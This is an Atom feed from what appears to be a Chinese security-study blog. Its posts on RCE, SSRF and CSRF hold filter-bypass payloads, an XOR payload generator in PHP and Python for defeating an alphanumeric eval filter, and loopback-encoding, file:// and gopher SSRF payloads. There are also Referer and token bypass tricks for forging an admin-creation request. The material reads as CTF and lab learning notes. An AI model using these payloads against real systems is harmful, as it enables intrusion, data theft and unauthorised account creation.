<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title></title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-12-09T08:33:49.280Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>xxshh</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XXE漏洞</title>
    <link href="http://example.com/2024/12/09/XXE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/12/09/XXE%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-12-09T06:56:21.000Z</published>
    <updated>2024-12-09T08:33:49.280Z</updated>
    
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>RCE漏洞</title>
    <link href="http://example.com/2024/12/09/RCE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/12/09/RCE%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-12-09T01:42:48.000Z</published>
    <updated>2024-12-09T08:33:41.203Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常见RCE漏洞函数"><a href="#常见RCE漏洞函数" class="headerlink" title="常见RCE漏洞函数"></a>常见RCE漏洞函数</h1><ul><li><p><strong>PHP</strong></p><ul><li><p><strong>代码执行</strong>函数：eval(), assert(), preg_replace(), create_function(), array_map(), call_user_func(), call_user_func_array(), array_filter(), uasort()等。</p></li><li><p><strong>命令执行</strong>函数：system(), exec(), shell_exec(), pcntl_exec(), popen(), proc_popen, passthru()等。</p></li><li><p>两者可以相互转换，如代码执行传入 system (ls) 转化为命令执行；命令执行也可以转化为代码执行 (如使用 php 或 python 环境变量执行代码)</p></li></ul></li><li><p><strong>Python</strong></p><ul><li>eval, exec, subprocess, os.system, commands</li></ul></li><li><p><strong>Java</strong></p><ul><li>Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL等。</li></ul></li></ul><h1 id="关键字过滤绕过"><a href="#关键字过滤绕过" class="headerlink" title="关键字过滤绕过"></a>关键字过滤绕过</h1><ol><li><strong>通配符</strong></li></ol><figure class="highlight gams"><table><tr><td class="code"><pre><code class="hljs gams"><span class="hljs-comment">*：代表一个或多个字符。</span><br>？：代表任意 <span class="hljs-number">1</span> 个字符。<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241209133000.png"></p><ol start="2"><li><strong>转义符号</strong></li></ol><p><img src="/../images/Pasted%20image%2020241209133118.png"></p><ol start="3"><li><strong>空变量</strong></li></ol><figure class="highlight crystal"><table><tr><td class="code"><pre><code class="hljs crystal">如<span class="hljs-variable">$*</span>, <span class="hljs-variable">$@</span>, <span class="hljs-variable">$x</span>,<span class="hljs-variable">$&#123;</span>x&#125;，因为没有变量没有定义，所以相当于空变量<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241209133558.png"></p><ol start="4"><li><strong>拼接法</strong></li></ol><p><img src="/../images/Pasted%20image%2020241209133921.png"></p><ol start="5"><li><strong>反引号</strong></li></ol><figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata">Linux会先执行被反引号包裹的内容。<br><br><span class="hljs-keyword">cat</span> `<span class="hljs-keyword">ls</span>`   # 如此处先执行<span class="hljs-keyword">ls</span>返回flag,然后语句就拼接成为 <span class="hljs-keyword">cat</span> flag<br></code></pre></td></tr></table></figure><ol start="6"><li><strong>编码</strong></li></ol><ul><li>将关键字进行编码，传入命令时，解码为我们需要的值。</li></ul><p><img src="/../images/Pasted%20image%2020241209135310.png"></p><ol start="7"><li><strong>组合绝活</strong></li></ol><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">touch <span class="hljs-string">&quot;ag&quot;</span><br>touch <span class="hljs-string">&quot;fl\\&quot;</span><br>touch <span class="hljs-string">&quot;t \\&quot;</span><br>touch <span class="hljs-string">&quot;ca\\&quot;</span><br><span class="hljs-keyword">ls</span> -t &gt;<span class="hljs-keyword">shell</span><br><span class="hljs-keyword">sh</span> <span class="hljs-keyword">shell</span><br><br>// \ 指的是换行<br>// <span class="hljs-keyword">ls</span> -t 是将文本按时间排序输出<br>// <span class="hljs-keyword">ls</span> -t &gt;<span class="hljs-keyword">shell</span> 将输出输入到 <span class="hljs-keyword">shell</span> 文件中<br>// <span class="hljs-keyword">sh</span> 将文本中的文字读取出来执行, 虽然有报错，但是<span class="hljs-keyword">shell</span>命令还是会进行执行<br></code></pre></td></tr></table></figure><ol start="8"><li><strong>rce-xor（重点）</strong></li></ol><p>如有下面这样一个 php 过滤页面：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 不报错,不显示任何报错</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>,<span class="hljs-variable">$code</span>))&#123;   <span class="hljs-comment">// 过滤所有字母和数字</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br></code></pre></td></tr></table></figure><p>过滤了所有字母和数字，这种情况可以使用异或脚本绕过：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//rce-xor.php</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;res.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>            <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>            <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>                <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">//rce-xor.py<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>    s1 = <span class="hljs-string">&quot;&quot;</span><br>    s2 = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>        f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            t = f.readline()<br>            <span class="hljs-keyword">if</span> t == <span class="hljs-string">&quot;&quot;</span>:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>] == i:<br>                <span class="hljs-comment"># print(i)</span><br>                s1 += t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>                s2 += t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>                <span class="hljs-keyword">break</span><br>        f.close()<br>    output = <span class="hljs-string">&quot;(\&quot;&quot;</span> + s1 + <span class="hljs-string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="hljs-string">&quot;\&quot;)&quot;</span><br>    <span class="hljs-keyword">return</span> (output)<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    param = action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function：&quot;</span>)) + action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command：&quot;</span>)) + <span class="hljs-string">&quot;;&quot;</span><br>    <span class="hljs-built_in">print</span>(param)<br></code></pre></td></tr></table></figure><p>使用时先根据题目的正则修改 php 中的正则表达式，将运行后生成的 txt 文件放置到对应 py 文件的目录下，运行 py 文件来生成自己想要执行的函数和命令。将生成的 payload 传入接收参数的变量 code。</p><ol start="9"><li><strong>命令关键词被过滤（如 cat tac 等）</strong>**</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">more:一页一页的显示档案内容<br>less:与 more 类似<br><span class="hljs-built_in">head</span>:查看头几行<br><span class="hljs-built_in">tac</span>:从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是 <span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>:查看尾几行<br><span class="hljs-built_in">nl</span>：显示的时候，顺便输出行号<br><span class="hljs-built_in">od</span>:以二进制的方式读取档案内容<br>vi:一种编辑器<br>vim:一种编辑器<br><span class="hljs-built_in">sort</span>:可以查看<br><span class="hljs-built_in">uniq</span>:可以查看<br>file -f:报错出具体内容<br>sh /flag 2&gt;%261 //报错出文件内容<br>curl file:///root/f/flag 使用file伪协议读取本地文件<br>strings flag <br><span class="hljs-built_in">uniq</span> -c flag<br>bash -v flag<br>rev flag<br></code></pre></td></tr></table></figure><ol start="10"><li><strong>空格被过滤</strong></li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">%09（url传递）(<span class="hljs-built_in">cat</span>%09flag.php)<br><span class="hljs-built_in">cat</span><span class="hljs-variable">$&#123;IFS&#125;</span>flag<br>&#123;<span class="hljs-built_in">cat</span>,flag&#125;  //&#123;commond,arg&#125;，第一个参数为要执行的命令，后面的参数是传入命令的参数<br></code></pre></td></tr></table></figure><ol start="11"><li><strong>参数逃逸</strong></li></ol><figure class="highlight mel"><table><tr><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><ol start="12"><li><strong>搭配文件包含和伪协议</strong></li></ol><figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">include $_GET[a]?&gt;&amp;a=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ver&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">include $_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=index.php</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常见RCE漏洞函数&quot;&gt;&lt;a href=&quot;#常见RCE漏洞函数&quot; class=&quot;headerlink&quot; title=&quot;常见RCE漏洞函数&quot;&gt;&lt;/a&gt;常见RCE漏洞函数&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;PHP&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>SSRF漏洞</title>
    <link href="http://example.com/2024/12/08/SSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/12/08/SSRF%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-12-08T10:42:29.000Z</published>
    <updated>2024-12-09T08:33:43.659Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>SSRF (Server-Side Request Forgery: 服务器端请求伪造) 一种由攻击者构造形成由服务端发起请求的一个安全漏洞；</p><p>一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><h1 id="协议利用"><a href="#协议利用" class="headerlink" title="协议利用"></a>协议利用</h1><figure class="highlight dts"><table><tr><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//  Web常见访问，如http://127.0.0.1</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">file:</span><span class="hljs-comment">// 从文件系统中获取文件内容，如，file://etc/passwd</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">dict:</span><span class="hljs-comment">// 字典服务器协议，访问字典资源，如，dict://ip:6739/info：</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">sftp:</span><span class="hljs-comment">// SSH文件传输协议或安全文件传输协议</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">ldap:</span><span class="hljs-comment">// 轻量级目录访问协议</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">tftp:</span><span class="hljs-comment">// 简单文件传输协议</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">gopher:</span><span class="hljs-comment">// 分布式文档传递服务，可使用gopherus生成payload。由于有部分协议http这类不支持，可以gopher来进行通讯（mysql，redis等）</span><br></code></pre></td></tr></table></figure><h1 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h1><ul><li>过滤返回信息，验证远程服务器对请求的响应。</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li><li>限制请求的端口为 http 常用的端口，比如，80,443,8080,8090。</li><li>黑名单内网 ip。避免应用被用来获取获取内网数据，攻击内网。</li><li>禁用不需要的协议。仅仅允许 http 和 https 请求。可以防止类似于 file:&#x2F;&#x2F;, gopher:&#x2F;&#x2F;, ftp:&#x2F;&#x2F; 等引起的问题。</li></ul><h1 id="白盒绕过"><a href="#白盒绕过" class="headerlink" title="白盒绕过"></a>白盒绕过</h1><ol><li>无过滤直接获取<br><img src="/../images/Pasted%20image%2020241208210216.png"></li></ol><p>payload：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<br>url=file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br></code></pre></td></tr></table></figure><ol start="2"><li>IP地址进制绕过</li></ol><p>正则过滤规则 &#x2F;localhost|127.0.|。&#x2F;i</p><p>payload:</p><figure class="highlight qml"><table><tr><td class="code"><pre><code class="hljs qml">十六进制<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0x7F.0.0.1/flag.php</span><br>八进制<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0177.0.0.1/flag.php</span><br><span class="hljs-number">10</span> 进制整数格式<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//2130706433/flag.php</span><br><span class="hljs-number">16</span> 进制整数格式，还是上面那个网站转换记得前缀<span class="hljs-number">0</span>x<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0x7F000001/flag.php</span><br>还有一种特殊的省略模式<br>    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>写成<span class="hljs-number">127.1</span><br>用CIDR绕过localhost<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//127.127.127.127/flag.php</span><br>还有很多方式<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0/flag.php</span><br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0.0.0.0/flag.php</span><br></code></pre></td></tr></table></figure><ol start="3"><li>域名解析IP绕过</li></ol><p>将自己拥有的域名添加一个记录解析为127.0.0.1。</p><p>如：test.xxx.com -&gt; 127.0.0.1</p><p>payload:</p><figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://test.xxx.com/flag.php<br></code></pre></td></tr></table></figure><ol start="4"><li>利用重定向解析绕过</li></ol><p>在自己服务器上写一个跳转页面代码如下:</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://服务器ip/xx.php<br></code></pre></td></tr></table></figure><ol start="5"><li>匹配且不影响写法解析</li></ol><p>正则匹配规则 (url 中必须包含) &#x2F;http://ctf.. * show$&#x2F;i</p><p>payload:</p><figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://ctf.@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<span class="hljs-comment">#show</span><br></code></pre></td></tr></table></figure><ol start="6"><li>利用gopher协议打服务</li></ol><p>有一些前提条件，比如redis未授权、mysql无密码等。<br><img src="/../images/Pasted%20image%2020241208212140.png"></p><p><img src="/../images/Pasted%20image%2020241208212714.png"></p><p>利用工具：<a href="https://github.com/tarunkant/Gopherus" title="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p><img src="/../images/Pasted%20image%2020241208213030.png"></p><p>注意工具生成的url,要进行一次url编码，因为服务器会自动解一次码。</p><p>执行payload后就生成了x.php。<br><img src="/../images/Pasted%20image%2020241208213141.png"></p><h1 id="无回显的解决办法"><a href="#无回显的解决办法" class="headerlink" title="无回显的解决办法"></a>无回显的解决办法</h1><ol><li>dnslog 外带</li></ol><p><a href="https://blog.csdn.net/weixin_39190897/article/details/117197126">浅析DNSlog在渗透测试中的实战技巧_xml +dnslog-CSDN博客</a></p><ol start="2"><li>反向连接</li></ol><p><img src="/../images/Pasted%20image%2020241208214638.png"></p><p><img src="/../images/Pasted%20image%2020241208214645.png"></p><p><img src="/../images/Pasted%20image%2020241208214655.png"></p><ol start="3"><li>正向连接</li></ol><p>一般RCE执行可以用这个方式，SSRF得用第一种方式，因为SSRF无法写文件。</p><p>写个文件在对方网站目录下，然后再去访问网站目录是否存在这个文件就能判断目标是否执行了RCE命令。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;SSRF (Server-Side Request Forgery: 服务器端请求伪造) 一种由攻击者构造形成由服务端发起请求的一个安全漏洞</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>CSRF漏洞</title>
    <link href="http://example.com/2024/12/07/CSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/12/07/CSRF%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-12-07T12:16:30.000Z</published>
    <updated>2024-12-09T08:33:22.626Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>CSRF（Cross-Site Request Forgery）跨站请求伪造，是一种利用用户在某网站的身份认证信息，通过伪造请求来执行恶意操作的攻击方式。</p><ol><li><p>受害者登录：受害者先登录一个网站（如网上银行、社交平台等），并且此时浏览器保存了该网站的登录认证信息（比如 cookie）。</p></li><li><p>攻击者构造恶意请求：攻击者构造一个恶意网页或链接，链接中包含一个目标网站的请求（如更改账户密码、转账等）。该请求看似合法，但实际上是恶意构造的。</p></li><li><p>受害者点击链接：受害者在不知情的情况下点击了攻击者诱导的链接，或访问了包含恶意请求的网页。</p></li><li><p>伪造请求被发送：由于受害者已经登录目标网站，浏览器会自动附带上该网站的 Cookie 等身份认证信息，目标网站接收到这个伪造的请求时，认为这个请求来自合法用户，从而执行了恶意操作。</p></li></ol><h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><ol><li><p>需要伪造请求数据包。</p></li><li><p>无过滤防护，或有过滤防护但可以绕过。</p></li><li><p>受害者触发 (钓鱼)。</p></li></ol><h1 id="无防护"><a href="#无防护" class="headerlink" title="无防护"></a>无防护</h1><p>演示靶场：发货 100 模板 T11 - 电子商城模板（PC）-&gt; 后台用户管理</p><p><img src="/../images/Pasted%20image%2020241208151356.png"></p><p>BurpSuite抓一个添加管理员的包：</p><p><img src="/../images/Pasted%20image%2020241208151519.png"></p><p>然后右键选择 -&gt;Engagement tools-&gt;Generate CSRF Poc-&gt;Options-&gt;Include auto-submit script</p><p>复制生成的html代码：</p><p><img src="/../images/Pasted%20image%2020241208151810.png"></p><p>将其放到攻击者网站目录：</p><p><img src="/../images/Pasted%20image%2020241208145310.png"></p><p>引诱目标人员在同一浏览器访问这个页面，即可攻击成功。</p><p><img src="/../images/Pasted%20image%2020241208151914.png"></p><p>此时在后台发现管理员已添加成功。</p><p><img src="/../images/Pasted%20image%2020241208152107.png"></p><p>若目标管理员未登录后台，或者后台 cookie 已经过期，需要重新登录，那么将无法完成攻击。</p><h1 id="有防护-Referer-同源"><a href="#有防护-Referer-同源" class="headerlink" title="有防护- Referer 同源"></a>有防护- Referer 同源</h1><p><img src="/../images/Pasted%20image%2020241208155904.png"></p><p>演示靶场：Zblog 后台用户管理</p><p><img src="/../images/Pasted%20image%2020241208160215.png"></p><p>按照上面步骤操作后，显示非法访问：<br><img src="/../images/Pasted%20image%2020241208160436.png"><br>查看网站源码，在 cmd.php 中找到了检测 referer 的函数 CheckIsRefererValid, 按住 Ctrl 点击，跳转到定义如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">CheckHTTPRefererValid</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"> </span>&#123;<br>     <span class="hljs-keyword">global</span> <span class="hljs-variable">$bloghost</span>;<br>     <span class="hljs-variable">$referer</span> = <span class="hljs-title function_ invoke__">GetVars</span>(<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>, <span class="hljs-string">&#x27;SERVER&#x27;</span>);  <span class="hljs-comment">// 获取请求中的referer</span><br>     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$referer</span>) === <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>     <span class="hljs-variable">$s</span> = <span class="hljs-variable">$bloghost</span>;<br>     <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:80/&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$s</span>);<br>     <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:443/&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$s</span>);<br>     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$referer</span>, <span class="hljs-variable">$s</span>) === <span class="hljs-literal">false</span>) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br> ​<br>     <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p><strong>绕过referer匹配的策略：</strong></p><p>目标网站：<a href="http://22.22.22.22/">http://22.22.22.22/</a><br>攻击者：<a href="http://11.11.11.11/">http://11.11.11.11/</a></p><ol><li>部分匹配</li></ol><p>如上面这个 zblog 靶场的 referer 检测就是 php 的 stripos 函数，该函数 stripos () 是查找字符串在另一字符串中第一次出现的位置，并且不区分大小写的。</p><p>此时将 referer 修改为这样即可绕过检测：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">11.11</span>.<span class="hljs-number">11.11</span><span class="hljs-regexp">/http:/</span><span class="hljs-regexp">/22.22.22.22/</span>add.html<br></code></pre></td></tr></table></figure><p>怎么构造这个 referer 呢？在你的网站下创建这样一个目录即可。这里讲思路，实际上实现不了这个，因为不能创建 http: &#x2F;&#x2F;这样的目录。</p><p>也可以针对不严谨的代码逻辑绕过。上面zblog 网站源码中，若 referer 为空也返回 true。有时候重新打开浏览器访问的时候就是没有 referer，所以不是代码有问题，只是逻辑不严谨。所以可以在add.html中设置referer为空。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;referrer&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;no-referrer&quot;</span>&gt;<br></code></pre></td></tr></table></figure><ol start="2"><li>完全匹配</li></ol><p>只能配合文件上传漏洞（上传到目标网站目录，这时候 referer 肯定就是目标网站本身）和XSS漏洞（利用JS代码发送add.html）绕过。</p><h1 id="有防护-Token校验"><a href="#有防护-Token校验" class="headerlink" title="有防护-Token校验"></a>有防护-Token校验</h1><p><img src="/../images/Pasted%20image%2020241208172243.png"></p><p><strong>绕过策略（代码逻辑不严谨）：</strong></p><ol><li><p>将 Token 参数值复用<br>即一个 Token 可以一直使用或者使用多次。</p></li><li><p>将 Token 参数删除<br>不验证 Token 的时候。</p></li><li><p>将 Token 参数值置空<br>Token 为空的时候也可以通过验证的情况。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;CSRF（Cross-Site Request Forgery）跨站请求伪造，是一种利用用户在某网站的身份认证信息，通过伪造请求来执行恶意操</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
